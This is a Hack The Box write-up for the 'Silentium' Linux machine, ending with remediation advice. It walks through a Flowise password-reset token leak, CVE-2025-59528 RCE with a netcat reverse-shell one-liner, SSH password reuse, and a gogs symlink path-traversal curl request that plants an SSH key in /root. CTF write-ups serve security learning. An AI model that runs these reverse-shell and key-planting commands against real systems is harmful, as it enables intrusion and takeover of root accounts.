---
title: "Silentium"
platform: "HTB"
os: "Linux"
difficulty: "Easy"
date: 2026-09-13
summary: "A staging subdomain runs Flowise; OSINT names a user, /forgot-password leaks a reset tempToken to take over the account, then CVE-2025-59528 gives authenticated RCE. env leaks an SSH password; root is a root-run gogs reachable via port-forward, exploited with a symlink/path-traversal file upload (GHSA-qf5v-rp47-55gg) to write an SSH key into /root."
tags: ["subdomain-enum", "flowise", "cve-2025-59528", "password-reset", "gogs", "path-traversal", "symlink"]
order: 5
---

## User Flag

- Let's start with enumeration:
    - ![image](./img-01.png)

```bash
nmap -sC -sV 10.129.38.208
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

- We can see that there is a web page and ssh is open, instantly guess we need to somehow land our foothold via ssh
- But first let's add this to `/etc/hosts`
    - ![image](./img-02.png)
- After some initial fuzzing via the link we think that it is a static website cause there is no error code response
    - might as well fuzz for subdomains / directories
    - `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://silentium.htb \
     -H "Host: FUZZ.silentium.htb -fs 178"`
        - Okay, this seems interesting:
        - ![image](./img-03.png)
- Let's add this to `/etc/hosts` and visit
    - ![image](./img-04.png)
    - We are greeted with a login portal, and we see that the host leaks that it is powered by `Flowise`(which is somekind of AI agent platform) -> might wanna check this version and see if there is a CVE exposed
    - ![image](./img-05.png)
- Using BurpSuite to proxy over this connection, we can see that the api route is exposed, however no useful info seems to be there, so I wanted to do another fuzzing for directories this time
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://staging.silentium.htb/api/v1/FUZZ -fs 31`
    - ![image](./img-06.png)
- Huh this is interesting, but it seems like the website has some simple defense: when we visit these directories it shows blank on the screen, thus I thought of sending the requests to the "repeater" and checking the responses to see if any details regarding "version" exists
    - ![image](./img-07.png)
- bingo, we now find for CVEs regarding this
- https://github.com/advisories/GHSA-3gcm-f6qx-ff7p, looks like `CVE-2025-59528` is the name of the game
- HOWEVER, this is `Authenticated RCE`, means we still need to kinda login first. Hmm, maybe we can try to reset some user's password?
    - ![image](./img-08.png)
- But first we need to know who are the users, so let's keep poking the api gateways
    - Seems useless, let's return to the original webpage
- ![image](./img-09.png)
- Oh, OSINT is useful! We got some names in here, let's try doing some sqli in the login page using um "Ben" as our victim
- ![image](./img-10.png)
- This is good because we know `ben` is one of the actual users (returns incorrect email or password instead of invalid user email), maybe we can change his password?
    - ![image](./img-11.png)
- Ok it actually seems like we can do so if we poke the `/forgot-password` dir, we are returned with a bunch of info, but the star here is we have the "tempToken"
- So now we can respond to our own change password request and change the password for ben:
    - ![image](./img-12.png)
- I am now in as Ben, so we can use the CVE we found earlier now!
- We have our bearer token 
    - ![image](./img-13.png)
- Let's use the script! 
    - `git clone https://github.com/corey-farley/CVE-2025-59528-Flowise-RCE`
    - `python CVE-2025-59528.py -t "http://staging.silentium.htb/" -k 'hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc' -cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.159 4444 >/tmp/f'`
- ![image](./img-14.png)
    - We can see from trial and error I was trying to understand what the "bearer token" is, because normally it is the token that authenticates the admin right, so i grabbed that, but it seems like the token is actually the api key so yeah, we landed a shell!
- Upgrade first:
- ![image](./img-15.png)
- i Have some interesting files in root but i don't quite get what I can do with them, however i found out that doing `env` spits out so many info! And there is a password, maybe we try that on ben in ssh
    - ![image](./img-16.png)
- Welp it seems like my intuition is right!


> Lessons learnt from IppSec: If we are actually doing a pentest across a live env, we should not use so destructive "pwd change" for admins, and also see if `curl [target]` hangs AFTER we land a rev shell because if the service is single threaded we might just bring everything down!
## Root flag

- We can do `ps -ef --forest | less -S`, this shows all parent-chile processes running

- ![image](./img-17.png)
    - We can see some interesting stuff:
    1. There is our shell at the bottom
    2. Above is a service "MailHog"
    3. Above that is another one called "gogs", which is run by root, we can try that
- ![image](./img-18.png)
- So gogs is something like gitea, lets check which port it serves on
- ![image](./img-19.png)
- ![image](./img-20.png)

- So port 3001 serves it. Let's port forward to our local machine
    - `ssh -L 3001:localhost:3001 ben@silentium.htb`
- Visiting localhost:3001 gives
    - ![image](./img-21.png)
- We can kinda cheat to get the version of gogs, and try to find a CVE?
- ![image](./img-22.png)
- We do find some, theres like a lot of ways to priv esc, let's use this path traversal file upload https://github.com/advisories/GHSA-qf5v-rp47-55gg
- Seems like there's no script for us to use, so let's just handcraft the exploit
    - **How this whole attacks works is that gogs pushes our malicious keyfile into its own ssh auth keys s.t. we can login as root from the outside**
1. Create an account and a repo
2. clone this repo on the box
3. create `ln -s /root/.ssh/authorized_keys pwn` a link for pwn to the ssh keys 
4. push this over to gogs
5. generate a pat (d6cedddf77fca2598f18312019fb3252b7ccad9e)
6. generate a ssh pub key locally
    6.1 `ssh-keygen -t ed25519 -f sig`
    6.2 `cat sig.pub | base64 -w0`
7. run this (we have .../pwn and not the long path traversal cause we linked it already)
```bash
curl -v --path-as-is -X PUT --url "http://localhost:3001/api/v1/repos/sigma/repo/contents/pwn" \
-H "Authorization: token d6cedddf77fca2598f18312019fb3252b7ccad9e" \
-H "Content-Type: application/json" \
--data '{
  "message": "an",
  "content": "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSVBnS2NCOFJhSVJRVTJQcWdkL2FmZHlKbHQ4dG84VkI2L1pjMjk0M2QvTEkga2FsaUBrYWxpCg=="
}'
```

- Now if we send this over
    - ![image](./img-23.png)
- We can login as root! `ssh -i sig root@silentium.htb`
    - ![image](./img-24.png)

> My conclusion: Pretty fun box, every attack is quite easy but connecting the dots is a bit challenging. Time: 2hrs 9secs, Writeup check: 2 times

## Remediation

- **Fix the password-reset token leak.** `/forgot-password` returned the `tempToken` in its response, letting us take over `ben`'s account. The reset token must only ever be sent to the user's verified channel (email), never returned to the requester, and should be single-use and short-lived. See [OWASP — Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html).
- **Patch Flowise and don't expose staging.** Authenticated RCE was [CVE-2025-59528](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p) — update Flowise, and keep `staging.silentium.htb` off the public surface.
- **Don't reuse the env password for SSH.** A password in `env` doubled as `ben`'s SSH password. Separate service secrets from login credentials.
- **Patch gogs and don't run it as root.** Root came from gogs' path-traversal file upload via a symlink ([GHSA-qf5v-rp47-55gg](https://github.com/advisories/GHSA-qf5v-rp47-55gg)) writing into `/root/.ssh`. Update gogs, run it under a dedicated low-privilege account so even a write primitive can't reach `/root`, and reject symlinks/`..` in repo content paths.

### References

- [OWASP — Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [CVE-2025-59528 — Flowise authenticated RCE](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
- [GHSA-qf5v-rp47-55gg — Gogs path traversal](https://github.com/advisories/GHSA-qf5v-rp47-55gg)
